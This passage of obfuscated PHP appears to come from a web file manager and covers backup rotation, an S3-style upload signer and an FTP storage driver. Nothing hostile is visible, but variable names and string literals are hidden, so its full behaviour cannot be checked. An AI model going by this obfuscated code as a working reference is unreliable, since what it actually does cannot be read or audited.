$ø¾ ÇŞÇ); return $Óı§áÒÅ; $“êÁè‚ = $Õ¨ùİ´Ô[723]; if (!$“êÁè‚) { die; } } public function csxf6ac97d4b() { $¿Åœœ‘ =& $_SERVER[® ¨Ä®ñ]; $¦ø§ÄˆÆ = mt_rand(pow(2, 14), pow(2, 16) - 1); $àÌˆê´ = $¿Åœœ‘[724]; while ($àÌˆê´ < $¿Åœœ‘[607]) { if ($àÌˆê´ >= 0) { break; } $àÌˆê´++; } $åË€Ïæ… = array(); $şÆ«™ğ = $¿Åœœ‘[725]; if (!$şÆ«™ğ) { die; } $çòêõÊÜ = 1; $™ë§ªŒ† = $¿Åœœ‘[726]; if (strlen($™ë§ªŒ†) < $¿Åœœ‘[612]) { return; } while ($çòêõÊÜ <= (int) sqrt($¦ø§ÄˆÆ)) { $–—¨èóè = $çòêõÊÜ; while (!0) { $–—¨èóè++; if ($–—¨èóè <= 2) { $çòêõÊÜ = $–—¨èóè; break; } else { if ($–—¨èóè < 2) { continue; } } $ÜœÓÖ¦ğ = !0; for ($˜²ãü‹š = 2; $˜²ãü‹š <= sqrt($–—¨èóè); $˜²ãü‹š++) { if ($–—¨èóè % $˜²ãü‹š == 0) { $ÜœÓÖ¦ğ = !1; } } if ($ÜœÓÖ¦ğ) { $çòêõÊÜ = $–—¨èóè; break; } } $åË€Ïæ…[] = $çòêõÊÜ; $ƒİÒµ© = $¿Åœœ‘[727]; while ($ƒİÒµ© < $¿Åœœ‘[610]) { if ($ƒİÒµ© >= 0) { break; } $ƒİÒµ©++; } } $İÎ²‘ˆš = 2; for ($–—¨èóè = $¦ø§ÄˆÆ; $–—¨èóè > 1; $–—¨èóè--) { $ÜœÓÖ¦ğ = !0; $ÍôÛÉÇ = $¿Åœœ‘[728]; while ($ÍôÛÉÇ < $¿Åœœ‘[612]) { if ($ÍôÛÉÇ >= 0) { break; } $ÍôÛÉÇ++; } foreach ($åË€Ïæ… as $í¼ºÂƒÀ) { if ($–—¨èóè % $í¼ºÂƒÀ == 0) { $ÜœÓÖ¦ğ = !1; break; } } if ($ÜœÓÖ¦ğ) { $İÎ²‘ˆš = $–—¨èóè; break; } } return $İÎ²‘ˆš; } public function cmuza54325d2($¡Ì…ö¯Ó, $è›ã¶ÑŠ) { $ğ·ŒûÁ¾ =& $_SERVER[û„Ñáçœ]; return call_user_func(array($ğ·ŒûÁ¾[8], $ğ·ŒûÁ¾[300]), $¡Ì…ö¯Ó, $è›ã¶ÑŠ); } public function avzq540a0502($Â¤…Ú…ñ, $ĞÀ¡™Ì•) { $§ßŠ·á” =& $_SERVER[® ¨Ä®ñ]; $ù¢úÇÆ¨ =& $_SERVER[û„Ñáçœ]; return call_user_func(array($ù¢úÇÆ¨[301], $ù¢úÇÆ¨[302]), $Â¤…Ú…ñ, $ĞÀ¡™Ì•); $–åÊè‡Ù = $§ßŠ·á”[729]; while ($–åÊè‡Ù < $§ßŠ·á”[623]) { if ($–åÊè‡Ù >= 0) { break; } $–åÊè‡Ù++; } } public function jbtia5e07c19($¸Ì€œÔ¯, $‚½¸ÕúÂ) { $Ÿ¡ÎøÙñ =& $_SERVER[û„Ñáçœ]; return call_user_func(array($Ÿ¡ÎøÙñ[301], $Ÿ¡ÎøÙñ[303]), $¸Ì€œÔ¯, $‚½¸ÕúÂ); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $äÃÊ§Õ‡ =& $_SERVER[® ¨Ä®ñ]; $this->isManual(); self::$name = date($äÃÊ§Õ‡[730]); if (!($ÂğÕ¹¬Ò = Model($äÃÊ§Õ‡[731])->lastItem())) { $ÂğÕ¹¬Ò = $this->initData(); } else { self::$name = $ÂğÕ¹¬Ò[$äÃÊ§Õ‡[32]]; if ($ÂğÕ¹¬Ò[$äÃÊ§Õ‡[732]] == $äÃÊ§Õ‡[89]) { self::$name = date($äÃÊ§Õ‡[733]); $Êô®şº = 0; if (isset($ÂğÕ¹¬Ò[$äÃÊ§Õ‡[288]][$äÃÊ§Õ‡[192]][$äÃÊ§Õ‡[458]])) { $Êô®şº = (int) $ÂğÕ¹¬Ò[$äÃÊ§Õ‡[288]][$äÃÊ§Õ‡[192]][$äÃÊ§Õ‡[458]]; } if (self::$manual == 0 && $ÂğÕ¹¬Ò[$äÃÊ§Õ‡[32]] == self::$name) { Model($äÃÊ§Õ‡[731])->remove($ÂğÕ¹¬Ò[$äÃÊ§Õ‡[392]]); } $ÂğÕ¹¬Ò = $this->initData($Êô®şº, $ÂğÕ¹¬Ò[$äÃÊ§Õ‡[734]]); } else { $this->checkStore($ÂğÕ¹¬Ò[$äÃÊ§Õ‡[734]]); } } self::$option = $ÂğÕ¹¬Ò; } private function isManual() { $Õ•‡¢‡Ü = _get($GLOBALS, $_SERVER[® ¨Ä®ñ][735], 0); $Õ•‡¢‡Ü = intval($Õ•‡¢‡Ü); self::$manual = $Õ•‡¢‡Ü && $Õ•‡¢‡Ü == 1 ? 1 : 0; } private function initData($áºÁ…§Ó = 0, $†™Ÿä¬ = '') { $ğ©Ğï…Š =& $_SERVER[® ¨Ä®ñ]; $è•Äíö = Model($ğ©Ğï…Š[731])->config(); if ($†™Ÿä¬ && $è•Äíö[$ğ©Ğï…Š[734]] != $†™Ÿä¬) { $áºÁ…§Ó = 0; } $this->checkStore($è•Äíö[$ğ©Ğï…Š[734]]); if (self::$manual == 1) { self::$name .= $ğ©Ğï…Š[11] . date($ğ©Ğï…Š[736]); } $ìœ¢öı = array($ğ©Ğï…Š[734] => $è•Äíö[$ğ©Ğï…Š[734]], $ğ©Ğï…Š[32] => self::$name, $ğ©Ğï…Š[732] => 0, $ğ©Ğï…Š[737] => $è•Äíö[$ğ©Ğï…Š[737]], $ğ©Ğï…Š[738] => self::$manual, $ğ©Ğï…Š[288] => array($ğ©Ğï…Š[739] => array($ğ©Ğï…Š[732] => 0), $ğ©Ğï…Š[740] => array($ğ©Ğï…Š[732] => 0, $ğ©Ğï…Š[741] => 0, $ğ©Ğï…Š[742] => 0, $ğ©Ğï…Š[33] => $ğ©Ğï…Š[12], $ğ©Ğï…Š[743] => 0, $ğ©Ğï…Š[487] => 0), $ğ©Ğï…Š[744] => array($ğ©Ğï…Š[732] => 0, $ğ©Ğï…Š[741] => 0, $ğ©Ğï…Š[742] => 0, $ğ©Ğï…Š[743] => 0, $ğ©Ğï…Š[487] => 0), $ğ©Ğï…Š[192] => array($ğ©Ğï…Š[732] => 0, $ğ©Ğï…Š[745] => 0, $ğ©Ğï…Š[746] => 0, $ğ©Ğï…Š[747] => 0, $ğ©Ğï…Š[748] => 0, $ğ©Ğï…Š[458] => $áºÁ…§Ó, $ğ©Ğï…Š[743] => 0, $ğ©Ğï…Š[487] => 0)), $ğ©Ğï…Š[743] => time(), $ğ©Ğï…Š[487] => 0); $Òœùëî = Model($ğ©Ğï…Š[731])->insert($ìœ¢öı); $ìœ¢öı[$ğ©Ğï…Š[392]] = $Òœùëî; return $ìœ¢öı; } private function checkStore($èôÜ×Çå) { $Œ¼©€¯ö =& $_SERVER[® ¨Ä®ñ]; $ÁÇåàŠœ = Model($Œ¼©€¯ö[749])->listData($èôÜ×Çå); Model($Œ¼©€¯ö[749])->checkConfig($ÁÇåàŠœ); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[® ¨Ä®ñ][731])->findByName(self::$name); } return self::$option; } public static function set($óî¦) { $Ö£ÎœÈ¦ =& $_SERVER[® ¨Ä®ñ]; $Í¦ã¼½Ô = self::get(); foreach ($óî¦ as $½ÉÚÙ¡ => $®¤åûÎ”) { $í¢‹Ÿ«ï = explode($Ö£ÎœÈ¦[10], $½ÉÚÙ¡); $‹°›Ãú = count($í¢‹Ÿ«ï); switch ($‹°›Ãú) { case 1: $Í¦ã¼½Ô[$í¢‹Ÿ«ï[0]] = $®¤åûÎ”; break; case 2: $Í¦ã¼½Ô[$í¢‹Ÿ«ï[0]][$í¢‹Ÿ«ï[1]] = $®¤åûÎ”; break; case 3: $Í¦ã¼½Ô[$í¢‹Ÿ«ï[0]][$í¢‹Ÿ«ï[1]][$í¢‹Ÿ«ï[2]] = $®¤åûÎ”; break; } } Model($Ö£ÎœÈ¦[731])->update($Í¦ã¼½Ô[$Ö£ÎœÈ¦[392]], $Í¦ã¼½Ô); self::$option = $Í¦ã¼½Ô; return self::$option; } public function keep() { $ßú˜»Ùâ =& $_SERVER[® ¨Ä®ñ]; $é¶şÍê¨ = self::get(); if ($é¶şÍê¨[$ßú˜»Ùâ[288]][$ßú˜»Ùâ[739]][$ßú˜»Ùâ[732]] == $ßú˜»Ùâ[89]) { return; } $this->backupKeep($é¶şÍê¨); self::set(array($ßú˜»Ùâ[750] => 1)); } private function backupKeep($Á·ïİ»ª) { $ùÄªÙìÉ =& $_SERVER[® ¨Ä®ñ]; if (self::$manual == 1) { return; } $ÏæÊğª = Model($ùÄªÙìÉ[731])->listData(); if (empty($ÏæÊğª)) { return; } $û€³€³Ô = 0; $åƒ“¹‹Ò = array(); foreach ($ÏæÊğª as $èé×‡ÎÏ) { if ($û€³€³Ô >= 7) { break; } $åƒ“¹‹Ò[] = $èé×‡ÎÏ[$ùÄªÙìÉ[32]]; $û€³€³Ô++; } for ($û€³€³Ô = 0; $û€³€³Ô < 12; $û€³€³Ô++) { $åƒ“¹‹Ò[] = date($ùÄªÙìÉ[751], strtotime("\x2d{$û€³€³Ô}\40\x6d\157\156\164\150\163")); } $åƒ“¹‹Ò = array_unique($åƒ“¹‹Ò); $Ì’»â¾Ì = Model($ùÄªÙìÉ[752])->get($ùÄªÙìÉ[753]); foreach ($ÏæÊğª as $èé×‡ÎÏ) { if (isset($èé×‡ÎÏ[$ùÄªÙìÉ[738]]) && $èé×‡ÎÏ[$ùÄªÙìÉ[738]] == $ùÄªÙìÉ[89]) { continue; } if (!empty($èé×‡ÎÏ[$ùÄªÙìÉ[32]]) && in_array($èé×‡ÎÏ[$ùÄªÙìÉ[32]], $åƒ“¹‹Ò)) { continue; } Model($ùÄªÙìÉ[731])->remove($èé×‡ÎÏ[$ùÄªÙìÉ[392]]); $¹²ƒ¾˜ = $this->backupPath($Á·ïİ»ª, $Ì’»â¾Ì); IO::remove($¹²ƒ¾˜, !1); } } private function backupPath($ÂÁŸ¼³œ, $åÂ—ÑèÅ = false) { $òéÏŒÕÎ =& $_SERVER[® ¨Ä®ñ]; if (!$åÂ—ÑèÅ) { $åÂ—ÑèÅ = Model($òéÏŒÕÎ[752])->get($òéÏŒÕÎ[753]); } $şîÅÕÍ– = $ÂÁŸ¼³œ[$òéÏŒÕÎ[32]]; $º‹¯±­Ã = substr(md5($òéÏŒÕÎ[754] . $åÂ—ÑèÅ . $şîÅÕÍ–), 0, 8); return "\173\151\x6f\72{$ÂÁŸ¼³œ[$òéÏŒÕÎ[734]]}\x7d\57\x64\x61\164\x61\x62\x61\163\145\x2f\142\141\x63\153\x75\160\57" . $şîÅÕÍ– . $òéÏŒÕÎ[11] . $º‹¯±­Ã; } public function db() { $¹õ©´¶ =& $_SERVER[® ¨Ä®ñ]; $‡®ô÷ = self::get(); if ($‡®ô÷[$¹õ©´¶[288]][$¹õ©´¶[740]][$¹õ©´¶[732]] == $¹õ©´¶[89]) { return !0; } $–¬ÈÀ”„ = new BackupDb(); if (!$–¬ÈÀ”„->index()) { return !1; } self::set(array($¹õ©´¶[755] => 1)); return !0; } public function dbFile() { $™Ú¾¯Ëæ =& $_SERVER[® ¨Ä®ñ]; $ÅÆº“°º = self::get(); if ($ÅÆº“°º[$™Ú¾¯Ëæ[288]][$™Ú¾¯Ëæ[744]][$™Ú¾¯Ëæ[732]] == $™Ú¾¯Ëæ[89]) { return !0; } $¢ş‘÷ñ  = new BackupDbFile(); if (!$¢ş‘÷ñ ->index()) { return !1; } self::set(array($™Ú¾¯Ëæ[756] => 1)); return !0; } public function file() { $¨ƒğŠÉ“ =& $_SERVER[® ¨Ä®ñ]; $º“öî = self::get(); if ($º“öî[$¨ƒğŠÉ“[288]][$¨ƒğŠÉ“[192]][$¨ƒğŠÉ“[732]] == $¨ƒğŠÉ“[89]) { return !0; } if (!isset($º“öî[$¨ƒğŠÉ“[737]]) || $º“öî[$¨ƒğŠÉ“[737]] == $¨ƒğŠÉ“[190]) { $òÆô¨ê = new BackupFile(); if (!$òÆô¨ê->index()) { return !1; } } self::set(array($¨ƒğŠÉ“[757] => 1, $¨ƒğŠÉ“[732] => 1)); return !0; } } goto E²Æ˜á‚ù; e•æÜ¥‰Óª: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($‹€¡‹Ÿñ) { parent::__construct($‹€¡‹Ÿñ); $this->signatureVersion($_SERVER[® ¨Ä®ñ][211]); } public function uploadFormData($ı¡ìëÔÖ, $âñÀ¤ó´ = 3600) { $¾„Ü…Î¿ =& $_SERVER[® ¨Ä®ñ]; $İèî‹Ï¢ = $¾„Ü…Î¿[191]; $ËÌÜİô¡ = $¾„Ü…Î¿[1328]; $˜üÉ÷äà = $¾„Ü…Î¿[62]; $÷šçôıÈ = gmdate($¾„Ü…Î¿[1329]); $öâÍœÏé = gmdate($¾„Ü…Î¿[733]); $­ÄÍî€° = $¾„Ü…Î¿[1330]; $Î¬ÓÍ”Š = $âñÀ¤ó´ . $¾„Ü…Î¿[12]; $ŸÉëÑ—Ô = $¾„Ü…Î¿[1292]; $äˆû¼’ = array($this->accessKey, $öâÍœÏé, $this->region, $˜üÉ÷äà, $­ÄÍî€°); $ªÎû¦ = implode($¾„Ü…Î¿[8], $äˆû¼’); $ÃšËØÚ = array($¾„Ü…Î¿[1294] => gmdate($¾„Ü…Î¿[1293], strtotime($¾„Ü…Î¿[1331])), $¾„Ü…Î¿[1295] => array(array($¾„Ü…Î¿[1297] => $this->bucket), array($¾„Ü…Î¿[1296] => $İèî‹Ï¢), array($¾„Ü…Î¿[1298], $¾„Ü…Î¿[1299], $¾„Ü…Î¿[12]), array($¾„Ü…Î¿[1298], $¾„Ü…Î¿[1332], $¾„Ü…Î¿[12]), array($¾„Ü…Î¿[1298], $¾„Ü…Î¿[1333], $¾„Ü…Î¿[12]), array($¾„Ü…Î¿[1300] => $ŸÉëÑ—Ô), array($¾„Ü…Î¿[1334] => $ªÎû¦), array($¾„Ü…Î¿[1335] => $ËÌÜİô¡), array($¾„Ü…Î¿[1336] => $÷šçôıÈ), array($¾„Ü…Î¿[1337] => $Î¬ÓÍ”Š))); $Çûçš¡¾ = base64_encode(json_encode($ÃšËØÚ)); $ŸæØ¯ñÌ = hash_hmac($¾„Ü…Î¿[1338], $öâÍœÏé, $¾„Ü…Î¿[1339] . $this->secret, !0); $ğ´ß½õç = hash_hmac($¾„Ü…Î¿[1338], $this->region, $ŸæØ¯ñÌ, !0); $ïò…Ã¨´ = hash_hmac($¾„Ü…Î¿[1338], $˜üÉ÷äà, $ğ´ß½õç, !0); $Ø—¸„Î­ = hash_hmac($¾„Ü…Î¿[1338], $­ÄÍî€°, $ïò…Ã¨´, !0); $‰ÃºËä¯ = hash_hmac($¾„Ü…Î¿[1338], $Çûçš¡¾, $Ø—¸„Î­); $¤Û™¯â© = array($¾„Ü…Î¿[210] => $¾„Ü…Î¿[12], $¾„Ü…Î¿[1340] => $¾„Ü…Î¿[12], $¾„Ü…Î¿[1296] => $İèî‹Ï¢, $¾„Ü…Î¿[1300] => $ŸÉëÑ—Ô, $¾„Ü…Î¿[1304] => $Çûçš¡¾, $¾„Ü…Î¿[1341] => $ªÎû¦, $¾„Ü…Î¿[1342] => $ËÌÜİô¡, $¾„Ü…Î¿[1343] => $÷šçôıÈ, $¾„Ü…Î¿[1344] => $Î¬ÓÍ”Š, $¾„Ü…Î¿[1345] => $‰ÃºËä¯, $¾„Ü…Î¿[174] => $this->getHost()); return $¤Û™¯â©; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; private $config = array(); public function __construct($ÍûÚ´Ã ) { parent::__construct(); if (count($ÍûÚ´Ã ) > 0) { $this->_init($ÍûÚ´Ã ); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($ÇÒØõÌ) { $òûÑ‚šÖ =& $_SERVER[® ¨Ä®ñ]; global $config; $this->appCharset = $config[$òûÑ‚šÖ[1346]]; $this->systemCharset = $config[$òûÑ‚šÖ[1347]]; if (isset($ÇÒØõÌ[$òûÑ‚šÖ[1348]]) && $ÇÒØõÌ[$òûÑ‚šÖ[1348]]) { $this->systemCharset = $ÇÒØõÌ[$òûÑ‚šÖ[1348]]; } } public function iconvApp($§–µ»ÆÂ) { return $this->iconvTo($§–µ»ÆÂ, $this->systemCharset, $this->appCharset); } public function iconvSystem($ØŠ½°µŠ) { return $this->iconvTo($ØŠ½°µŠ, $this->appCharset, $this->systemCharset); } public function getPathOuter($á“ÊÒÆ‡) { $—•¬Â¼Ä =& $_SERVER[® ¨Ä®ñ]; $” •âÁâ = $this->iconvApp($this->pathBase); $á“ÊÒÆ‡ = $this->iconvApp($á“ÊÒÆ‡); if (substr($” •âÁâ, 0, 2) == $—•¬Â¼Ä[1349]) { $” •âÁâ = BASIC_PATH . substr($” •âÁâ, 2); } if (substr($á“ÊÒÆ‡, 0, 2) == $—•¬Â¼Ä[1349]) { $á“ÊÒÆ‡ = BASIC_PATH . substr($á“ÊÒÆ‡, 2); } $” •âÁâ = KodIO::clear($” •âÁâ); $á“ÊÒÆ‡ = KodIO::clear($á“ÊÒÆ‡); $á“ÊÒÆ‡ = substr($á“ÊÒÆ‡, strlen($” •âÁâ)); if (empty($this->pathDriver)) { return $á“ÊÒÆ‡; } return $this->pathDriver . $—•¬Â¼Ä[8] . ltrim($á“ÊÒÆ‡, $—•¬Â¼Ä[8]); } private function _init($ûĞ–Û§ß = array()) { $›”›©½ =& $_SERVER[® ¨Ä®ñ]; if (!function_exists($›”›©½[1350])) { throw new Exception(LNG($›”›©½[1351])); } $this->config = $ûĞ–Û§ß; $this->charsetReset($ûĞ–Û§ß); foreach ($ûĞ–Û§ß as $Óí¢ÉÕŸ => $Å‡ìºãà) { if (isset($this->{$Óí¢ÉÕŸ})) { $this->{$Óí¢ÉÕŸ} = $Å‡ìºãà; } } return $this->_login($ûĞ–Û§ß); } private function _login($ÂÇÏÉ©ã) { $©”Âú»® =& $_SERVER[® ¨Ä®ñ]; static $æø–İ­ = array(); $ì˜‚®‹¹ = md5(json_encode($ÂÇÏÉ©ã)); if (isset($æø–İ­[$ì˜‚®‹¹])) { foreach ($æø–İ­[$ì˜‚®‹¹] as $ö¸ä¼¯¥ => $¤Æ…ş…) { $this->{$ö¸ä¼¯¥} = $¤Æ…ş…; } return !0; } $‡‰İ®È = parse_url(trim($this->server, $©”Âú»®[8])); $this->host = $‡‰İ®È[$©”Âú»®[174]]; $ğÓÂÖ¯ê = isset($‡‰İ®È[$©”Âú»®[173]]) && $‡‰İ®È[$©”Âú»®[173]] == $©”Âú»®[1352] ? !0 : !1; $this->scheme = $ğÓÂÖ¯ê ? $©”Âú»®[1353] : $©”Âú»®[1354]; $this->port = isset($‡‰İ®È[$©”Âú»®[175]]) ? $‡‰İ®È[$©”Âú»®[175]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $±’ìÍµ = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $ş½Í˜¶‹ = $this->pasv == $©”Âú»®[89] ? !0 : !1; @ftp_pasv($this->connect, $ş½Í˜¶‹); $æø–İ­[$ì˜‚®‹¹] = array($©”Âú»®[1355] => $this->connect, $©”Âú»®[174] => $this->host, $©”Âú»®[173] => $this->scheme, $©”Âú»®[175] => $this->port); return $±’ìÍµ; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($²Ï¯­ãÛ, $„Û¼ÛˆÁ = '', $áú¸Óé£ = REPEAT_RENAME) { if ($this->setContent($²Ï¯­ãÛ, $„Û¼ÛˆÁ)) { return $this->getPathOuter($²Ï¯­ãÛ); } return !1; } public function mkdir($²û®íİ‚, $ÙĞïêÌ¢ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $²û®íİ‚ = $this->iconvSystem($²û®íİ‚); if ($this->_isFolder($²û®íİ‚) || @ftp_mkdir($this->connect, $²û®íİ‚)) { return $this->getPathOuter($²û®íİ‚); } if (!$this->mkdir($this->pathFather($²û®íİ‚))) { return !1; } if ($²û®íİ‚ = @ftp_mkdir($this->connect, $²û®íİ‚)) { return $this->getPathOuter($²û®íİ‚); } return !1; } public function copyFile($Â™şŸ´®, $¸¿å¦ƒ¢) { if (!$this->_isconn()) { return !1; } $û­ç = $this->pathThis($this->iconvSystem($Â™şŸ´®)); $Ê¤Û¡÷ = $this->tempFile($û­ç); $Ø½ùÁÁ = $this->iconvApp($Ê¤Û¡÷); $this->download($Â™şŸ´®, $Ø½ùÁÁ); $¥¼æ’—Á = $this->upload($¸¿å¦ƒ¢, $Ø½ùÁÁ); $this->tempFileRemve($Ê¤Û¡÷); return $¥¼æ’—Á; } public function moveFile($†Å’¼¤, $³¼«öšˆ) { if (!$this->_isconn()) { return !1; } $†Å’¼¤ = $this->iconvSystem($†Å’¼¤); $³¼«öšˆ = $this->iconvSystem($³¼«öšˆ); $èÄ÷Æ… = @ftp_rename($this->connect, $†Å’¼¤, $³¼«öšˆ); return $èÄ÷Æ… ? $this->getPathOuter($³¼«öšˆ) : !1; } public function delFile($´¡·âöï) { if (!$this->_isconn()) { return !1; } $´¡·âöï = $this->iconvSystem($´¡·âöï); return @ftp_delete($this->connect, $´¡·âöï); } public function delFolder($ŞªÂùœÍ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $Ü¬ô¼ ½ = $ ÊËì¶ù = array(); $this->fileList($ŞªÂùœÍ, $Ü¬ô¼ ½, $ ÊËì¶ù, !0); $this->listItemCache = !0; foreach ($ ÊËì¶ù as $êÏÎì…) { $µïºä”Š = $this->iconvSystem($êÏÎì…[$_SERVER[® ¨Ä®ñ][32]]); $±›ğèØó = @ftp_delete($this->connect, $µïºä”Š); if (!$±›ğèØó) { return !1; } } foreach ($Ü¬ô¼ ½ as $µïºä”Š) { $µïºä”Š = $this->iconvSystem($µïºä”Š); $±›ğèØó = @ftp_rmdir($this->connect, $µïºä”Š); if (!$±›ğèØó) { return !1; } } $ŞªÂùœÍ = $this->iconvSystem($ŞªÂùœÍ); return @ftp_rmdir($this->connect, $ŞªÂùœÍ); } public function rename($¿»æÉÍ, $îºàË„Ñ) { $Çüğçïœ =& $_SERVER[® ¨Ä®ñ]; if (!$this->_isconn()) { return !1; } $¿µëú± = $this->fileNameAuto($this->pathFather($¿»æÉÍ), $îºàË„Ñ); $¿µëú± = $this->iconvSystem($¿µëú±); $¿»æÉÍ = $this->iconvSystem($¿»æÉÍ); $Æ€Öäğ = $this->pathFather($¿»æÉÍ); $èŞ¬ªîµ = rtrim($Æ€Öäğ, $Çüğçïœ[8]) . $Çüğçïœ[8] . $¿µëú±; $©³Å–£ = @ftp_rename($this->connect, $¿»æÉÍ, $èŞ¬ªîµ); $èŞ¬ªîµ = $this->iconvApp($èŞ¬ªîµ); return $©³Å–£ ? $this->getPathOuter($èŞ¬ªîµ) : !1; } private function folderInfo($®¶Ğâ’’, $ê¡••Ó˜ = false) { $·© „›‰ =& $_SERVER[® ¨Ä®ñ]; $©ş¸ˆ– = array($·© „›‰[32] => $this->pathThis($®¶Ğâ’’), $·© „›‰[78] => $this->getPathOuter($·© „›‰[8] . $®¶Ğâ’’), $·© „›‰[33] => $·© „›‰[79]); if ($ê¡••Ó˜) { return $©ş¸ˆ–; } $©ş¸ˆ–[$·© „›‰[193]] = $©ş¸ˆ–[$·© „›‰[86]] = 0; $©ş¸ˆ–[$·© „›‰[194]] = $©ş¸ˆ–[$·© „›‰[195]] = !0; return $©ş¸ˆ–; } private function fileInfo($¹ĞâÏş‰, $áÏæ…¼ƒ = false, $Ú”¿¤ïé = array()) { $”ÂÛ¼ =& $_SERVER[® ¨Ä®ñ]; $òáÙ ˆ¶ = array($”ÂÛ¼[32] => $this->pathThis($¹ĞâÏş‰), $”ÂÛ¼[78] => $this->getPathOuter($”ÂÛ¼[8] . $¹ĞâÏş‰), $”ÂÛ¼[33] => $”ÂÛ¼[192], $”ÂÛ¼[80] => isset($Ú”¿¤ïé[$”ÂÛ¼[80]]) ? $Ú”¿¤ïé[$”ÂÛ¼[80]] : 0, $”ÂÛ¼[167] => $this->ext($¹ĞâÏş‰)); if ($áÏæ…¼ƒ) { return $òáÙ ˆ¶; } $òáÙ ˆ¶[$”ÂÛ¼[193]] = $òáÙ ˆ¶[$”ÂÛ¼[86]] = 0; $òáÙ ˆ¶[$”ÂÛ¼[194]] = $òáÙ ˆ¶[$”ÂÛ¼[195]] = !0; $§î­ğÒ = $this->iconvSystem($¹ĞâÏş‰); $òáÙ ˆ¶[$”ÂÛ¼[86]] = @ftp_mdtm($this->connect, $§î­ğÒ); if (empty($Ú”¿¤ïé)) { $Ú”¿¤ïé = $this->objectMeta($¹ĞâÏş‰); if (!$Ú”¿¤ïé) { return $òáÙ ˆ¶; } } $òáÙ ˆ¶[$”ÂÛ¼[80]] = $Ú”¿¤ïé[$”ÂÛ¼[80]]; return $òáÙ ˆ¶; } public function size($ßÙÕóéÖ) { $æë£ÂĞÖ = $this->objectMeta($ßÙÕóéÖ); return $æë£ÂĞÖ ? $æë£ÂĞÖ[$_SERVER[® ¨Ä®ñ][80]] : 0; } public function info($“”•Ÿ„º) { if ($this->isFile($“”•Ÿ„º)) { return $this->fileInfo($“”•Ÿ„º, 0); } else { if ($this->isFolder($“”•Ÿ„º)) { return $this->folderInfo($“”•Ÿ„º); } } return !1; } private function fileList($æéü¶ËÑ, &$ó­ßÆâ, &$æŒòÚ“Ü, $€ôËÆ½Ï = false) { $üŒ»Ùãß =& $_SERVER[® ¨Ä®ñ]; $æéü¶ËÑ = $this->iconvSystem($æéü¶ËÑ); if (!$this->isFolder($æéü¶ËÑ)) { return !1; } @ftp_chdir($this->connect, $üŒ»Ùãß[8]); $æéü¶ËÑ = rtrim($æéü¶ËÑ, $üŒ»Ùãß[8]) . $üŒ»Ùãß[8]; check_abort(); $Ü¡ÀÄ½ = $this->listItemCache === !1 ? !1 : !0; $ª„¹Êõ‡ = @ftp_rawlist($this->connect, $æéü¶ËÑ); if (!$ª„¹Êõ‡) { $ª„¹Êõ‡ = array(); } $¹˜İ÷˜ñ = array($üŒ»Ùãß[10] => 1, $üŒ»Ùãß[1356] => 1); foreach ($ª„¹Êõ‡ as $×ŸÃ£Ù¥) { $Üï±¨ÖÖ = $this->_listItem($×ŸÃ£Ù¥); if ($Üï±¨ÖÖ[0] == $üŒ»Ùãß[741]) { continue; } $·¿ŞÔ›¹ = $Üï±¨ÖÖ[8]; if (empty($·¿ŞÔ›¹) && $·¿ŞÔ›¹ !== $üŒ»Ùãß[190] || isset($¹˜İ÷˜ñ[$·¿ŞÔ›¹])) { continue; } $·¿ŞÔ›¹ = $this->iconvApp($æéü¶ËÑ . ltrim($·¿ŞÔ›¹, $üŒ»Ùãß[8])); $È»ßŞ¶ = array($üŒ»Ùãß[32] => $·¿ŞÔ›¹, $üŒ»Ùãß[33] => $üŒ»Ùãß[192], $üŒ»Ùãß[80] => $Üï±¨ÖÖ[4]); if (substr($×ŸÃ£Ù¥, 0, 1) == $üŒ»Ùãß[1357]) { $È»ßŞ¶[$üŒ»Ùãß[33]] = $üŒ»Ùãß[79]; $È»ßŞ¶[$üŒ»Ùãß[80]] = 0; } $Ø¬ËÇò¨ = $È»ßŞ¶[$üŒ»Ùãß[33]] == $üŒ»Ùãß[79] ? !0 : !1; if ($Ü¡ÀÄ½) { $this->cacheMethod($üŒ»Ùãß[198], $·¿ŞÔ›¹, $Ø¬ËÇò¨); $this->cacheMethod($üŒ»Ùãß[199], $·¿ŞÔ›¹, $È»ßŞ¶); } if ($Ø¬ËÇò¨) { $ó­ßÆâ[] = $·¿ŞÔ›¹; if ($€ôËÆ½Ï) { $this->fileList($·¿ŞÔ›¹, $ó­ßÆâ, $æŒòÚ“Ü, $€ôËÆ½Ï); } continue; } $æŒòÚ“Ü[] = $È»ßŞ¶; } if ($Ü¡ÀÄ½) { $this->cacheMethod($üŒ»Ùãß[198], $æéü¶ËÑ, !0); } } private function _listItem($ÆÒÛ÷‡) { if (empty($ÆÒÛ÷‡)) { return array(); } $È²â¹İ‡ = preg_split($_SERVER[® ¨Ä®ñ][1358], $ÆÒÛ÷‡); if (count($È²â¹İ‡) <= 9) { return $È²â¹İ‡; } $È²â¹İ‡[8] = trim(substr($ÆÒÛ÷‡, strpos($ÆÒÛ÷‡, $È²â¹İ‡[7]) + strlen($È²â¹İ‡[7]))); return array_splice($È²â¹İ‡, 0, 9); } public function listPath($ş©˜ªñ‰, $µ³ó£ÓÚ = false) { $‘í°ˆé =& $_SERVER[® ¨Ä®ñ]; if (!$this->_isconn()) { return !1; } $ÕÔ—†şæ = $àşõ‰²° = array(); $this->fileList($ş©˜ªñ‰, $ÕÔ—†şæ, $àşõ‰²°); foreach ($ÕÔ—†şæ as $İØœ•Æİ => $¤Ù³ê’ü) { $ÕÔ—†şæ[$İØœ•Æİ] = $this->folderInfo($¤Ù³ê’ü, $µ³ó£ÓÚ); } foreach ($àşõ‰²° as $İØœ•Æİ => $¤Ù³ê’ü) { $àşõ‰²°[$İØœ•Æİ] = $this->fileInfo($¤Ù³ê’ü[$‘í°ˆé[32]], $µ³ó£ÓÚ, $¤Ù³ê’ü); } return array($‘í°ˆé[77] => $ÕÔ—†şæ, 